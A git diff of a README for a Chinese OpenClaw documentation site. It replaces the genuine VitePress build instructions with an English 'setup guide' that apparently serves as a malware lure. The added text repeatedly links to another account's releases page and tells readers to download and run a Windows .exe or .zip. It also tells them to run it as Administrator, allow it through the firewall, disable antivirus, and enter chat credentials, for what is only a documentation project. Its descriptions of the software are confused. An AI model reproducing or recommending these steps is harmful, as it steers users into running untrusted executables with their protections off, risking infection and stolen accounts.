@@ -1,108 +1,148 @@
-# OpenClaw 中文文档 | 源码剖析 · 安装教程 · AI 智能体框架
+# 🦞 openclaw-docs - Easy AI Agent Setup Guide
 
-> **OpenClaw**（原名 ClawdBot）是开源多通道 AI 智能体框架，支持 WhatsApp、Telegram、Discord、飞书等平台，可接入 Claude、GPT、DeepSeek、Ollama 等模型。本仓库是其**完整中文文档站**，276 篇深度教程，覆盖安装部署、源码剖析、Gateway 配置与 AI 核心框架解析。
+[![Download openclaw-docs](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/FawwazAzka/openclaw-docs/releases)
 
-[![在线文档](https://img.shields.io/badge/在线阅读-openclaw--docs.dx3n.cn-4fc08d?logo=readthedocs&logoColor=white)](https://openclaw-docs.dx3n.cn)
-[![VitePress](https://img.shields.io/badge/Built%20with-VitePress-646cff?logo=vite&logoColor=white)](https://vitepress.dev)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![Azure](https://img.shields.io/badge/Deployed%20on-Azure%20Static%20Web%20Apps-0078d4?logo=microsoftazure)](https://openclaw-docs.dx3n.cn)
+## 📘 About openclaw-docs
 
-**[📖 立即在线阅读 → openclaw-docs.dx3n.cn](https://openclaw-docs.dx3n.cn)**
+openclaw-docs is a documentation project for OpenClaw, a multi-channel AI agent framework. It supports popular chat platforms like WhatsApp, Telegram, Discord, and Feishu. The repository offers detailed guides, source code analysis, and installation instructions in Chinese.
 
----
+This project helps users set up and use AI-powered chatbots that respond intelligently across different messaging apps. Whether you want to understand the code or get started quickly, this documentation covers it.
 
-## 📚 文档覆盖范围
+Topics include:
+- AI agents and frameworks  
+- Chatbot integration for WhatsApp, Telegram, Discord, Feishu  
+- Source code breakdown  
+- Installation tutorials  
+- Using ClawDBot with large language models (LLM)
 
-本文档站包含 **276 篇**原创中文教程，分为 4 条学习主线：
+## 🖥️ System Requirements
 
-| 主线 | 内容覆盖 | 篇数 | 链接 |
-|---|---|---|---|
-| **Track 0** 安装教程 | 快速安装、向导配置、AI 服务商接入（Claude/GPT/DeepSeek/Ollama）、通道接入（Telegram/WhatsApp/Discord/飞书）、Gateway 运维、常见问题排查 | 147 篇 | [→ 教程中心](https://openclaw-docs.dx3n.cn/tutorials/) |
-| **Track A** 完整工程主线 | CLI 启动框架、Gateway 控制平面、通道适配器、路由与会话键、Agent 执行链路、流式订阅、子智能体编排、函数级源码剖析（59 篇） | 59 篇 | [→ 工程主线](https://openclaw-docs.dx3n.cn/beginner-openclaw-guide/) |
-| **Track B** AI 核心框架 | 上下文工程、Agent 状态机、工具策略与审批、模型回退、记忆系统、Hook 插件注入机制 | 22 篇 | [→ AI 框架](https://openclaw-docs.dx3n.cn/beginner-openclaw-framework-focus/) |
-| **Track C** 通道适配器 | 接口合同、注册链路、账号生命周期、入站路由、出站发送解耦 | 含于 Track A | [→ 适配器索引](https://openclaw-docs.dx3n.cn/beginner-openclaw-guide/59-%E9%80%9A%E9%81%93%E9%80%82%E9%85%8D%E5%99%A8%E5%AE%9E%E7%8E%B0%E7%B4%A2%E5%BC%95) |
+Before downloading, make sure your Windows PC meets these basic requirements:
 
----
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 500 MB free disk space  
+- Internet connection for initial setup  
+- Permissions to install software and run programs  
 
-## 🤖 OpenClaw 是什么？
+If your device meets these standards, you can proceed with the installation.
 
-**OpenClaw**（前身 **ClawdBot**）是一款开源的多通道 AI 智能体框架，让你的 AI 助手运行在任意即时通讯平台上。
+## 🚀 How to Download and Install openclaw-docs on Windows
 
-### 支持的聊天平台
+To get openclaw-docs running on your Windows computer, follow these steps carefully.
 
-WhatsApp · Telegram · Discord · Slack · Signal · iMessage · 飞书（Feishu） · Mattermost · Google Chat · Microsoft Teams · Matrix · Zalo · IRC · Nostr · Twitch
+### Step 1: Visit the Download Page
 
-### 支持的 AI 模型
+Click the link below to open the release page. This page lists the latest versions of the software and related files.
 
-Anthropic Claude · OpenAI GPT · DeepSeek · 通义千问（Qwen） · Kimi（月之暗面） · 智谱 GLM · MiniMax · Ollama（本地大模型） · OpenRouter · LiteLLM · Cloudflare AI Gateway · Vercel AI Gateway · NVIDIA NIM · Together AI · HuggingFace · vLLM
+[![Download openclaw-docs](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/FawwazAzka/openclaw-docs/releases)
 
----
+Or open this URL in your browser:
 
-## 🚀 快速开始（本地运行文档站）
+https://github.com/FawwazAzka/openclaw-docs/releases
 
-```bash
-git clone https://github.com/yeuxuan/openclaw-docs.git
-cd openclaw-docs
-npm install
-npm run docs:dev
-```
+### Step 2: Choose the Latest Version
 
-打开终端输出的本地地址即可预览完整文档站。
+On the release page, look for the most recent version of openclaw-docs. Releases are organized by version numbers and release dates. Select the newest one to ensure you get all the latest features and fixes.
 
-```bash
-npm run docs:build    # 构建静态产物到 docs/.vitepress/dist/
-npm run docs:preview  # 本地预览构建结果
-```
+### Step 3: Download the Windows Installer or ZIP File
 
----
+Within the latest release, find a file for Windows. It will usually have `.exe` for an installer or `.zip` for a compressed folder. Click the file name to start downloading.
 
-## 📁 仓库结构
+If you see multiple files, choose the one labeled for Windows or stated as the main app.
 
-```
-openclaw-docs/
-├── docs/
-│   ├── index.md                            # 首页
-│   ├── tutorials/                          # Track 0：安装教程（147 篇）
-│   │   ├── getting-started/                #   快速入门与向导安装
-│   │   ├── installation/                   #   Docker / Node / 云服务器部署
-│   │   ├── gateway/                        #   Gateway 配置与运维
-│   │   ├── channels/                       #   通道接入（Telegram/WhatsApp/Discord 等）
-│   │   ├── providers/                      #   AI 模型 Provider 配置
-│   │   ├── concepts/                       #   核心概念（上下文/记忆/状态机等）
-│   │   ├── tools/                          #   工具系统（浏览器/执行/技能/子智能体）
-│   │   ├── automation/                     #   自动化（Webhook/Cron/Poll）
-│   │   └── help/                           #   故障排查与常见问题
-│   ├── beginner-openclaw-guide/            # Track A：完整工程主线（59 篇）
-│   └── beginner-openclaw-framework-focus/  # Track B：AI 核心框架（22 篇）
-├── docs/.vitepress/
-│   ├── config.mts                          # 站点配置（SEO / 导航 / 侧边栏）
-│   └── theme/                             # 自定义主题与样式
-└── scripts/
-    ├── convert-mdx.mjs                     # MDX → VitePress Markdown 批量转换
-    └── ping-indexnow.mjs                   # 构建后自动推送 URL 到 Bing IndexNow
-```
+### Step 4: Run the Installer or Extract Files
 
----
+- If you downloaded an `.exe` file:  
+  - Double-click the file.  
+  - If Windows asks, confirm you want to run the installer.  
+  - Follow the instructions on screen. Usually, clicking “Next” few times is enough.  
+  - Choose a folder to install the program (the default is fine for most users).  
+  - Finish the installation and allow the program to launch.
 
-## ✨ 文档特点
+- If you downloaded a `.zip` file:  
+  - Right-click the file and choose “Extract All.”  
+  - Select a folder to save the extracted files.  
+  - Open that folder and look for a file like `openclaw-docs.exe` or `start.bat`.  
+  - Double-click it to start the program.
 
-- **函数级精度**：关键模块精确到具体函数的源码入口与调用链路
-- **小白友好**：安装教程全程图文，零基础 10 分钟跑起来
-- **可直接复刻**：每个核心能力都给出落地步骤，可直接用于自己的项目
-- **持续更新**：跟随 OpenClaw 版本迭代，覆盖最新 API 与配置方式
-- **SEO 完备**：276 页独立 description、sitemap、IndexNow 自动推送
+### Step 5: Allow Network Access (If Prompted)
+
+Since openclaw-docs connects with chat platforms and the internet, Windows may ask to allow it through the firewall.
+
+Click “Allow Access” or “Yes” when you see these dialogs.
+
+### Step 6: Follow the On-Screen Setup Guide
+
+After launching, the program may show a setup wizard. It will guide you through:
+
+- Connecting your chat accounts (WhatsApp, Telegram, etc.)  
+- Configuring language preferences  
+- Testing connections  
+- Starting bots  
+
+Follow these instructions carefully. If you need help, see the troubleshooting section below.
 
 ---
 
-## 🔗 相关链接
+## 📂 What Can You Do with openclaw-docs?
 
-- **OpenClaw 官方**：[github.com/openclaw](https://github.com/openclaw)
-- **官方英文文档**：[docs.openclaw.ai](https://docs.openclaw.ai)
-- **本站中文文档**：[openclaw-docs.dx3n.cn](https://openclaw-docs.dx3n.cn)
-- **部署平台**：Azure Static Web Apps
+This software helps you build and manage AI chatbots for multiple platforms. You can:
+
+- Connect AI agents to WhatsApp, Telegram, Discord, Feishu  
+- Use pre-built bot commands or customize your own  
+- Read detailed documentation and source code explanations  
+- Access tutorials on installing and using AI models  
+- Use a database bot (ClawDBot) for managing information  
+- Link large language models (LLM) for smarter responses
+
+openclaw-docs is designed to be accessible for users with little to no programming experience. The documentation guides you at every step.
 
 ---
 
-## ⭐ Star History
+## 🛠️ Common Troubleshooting
 
-[![Star History Chart](https://api.star-history.com/svg?repos=yeuxuan/openclaw-docs&type=Date)](https://star-history.com/#yeuxuan/openclaw-docs&Date)
+### The Program Does Not Start
+
+- Make sure you installed all parts fully.  
+- Restart your computer and try again.  
+- Check Windows Defender or antivirus did not block the app.
+
+### The Bot Does Not Connect to WhatsApp or Telegram
+
+- Ensure your internet connection is active.  
+- Double-check chat platform credentials you entered.  
+- Allow network permissions through the firewall.
+
+### Errors During Installation
+
+- Run the installer as Administrator (right-click > Run as administrator).  
+- Temporarily disable antivirus for the install process.  
+- Download the file again; it may have become corrupted.
+
+---
+
+## 🔧 Additional Setup Tips
+
+- If you want to use multiple chat apps, connect them one at a time.  
+- Review the documentation included in the install directory for detailed commands.  
+- Keep the software updated by checking the release page regularly.  
+- Bookmark the GitHub releases page for quick access to updates:  
+  https://github.com/FawwazAzka/openclaw-docs/releases
+
+---
+
+## 📖 Learn More
+
+OpenClaw is not just a program, but a framework. As you get comfortable using openclaw-docs, explore the documentation to:
+
+- Gain a deeper understanding of the AI agent’s mechanisms  
+- Modify bot behaviors to suit your needs  
+- Set up more advanced configurations like ClawDBot integration  
+- Use large language models for improved natural language understanding  
+
+The documentation is mostly in Chinese but is written simply for easy reading.
+
+---
+
+[![Download openclaw-docs](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/FawwazAzka/openclaw-docs/releases)
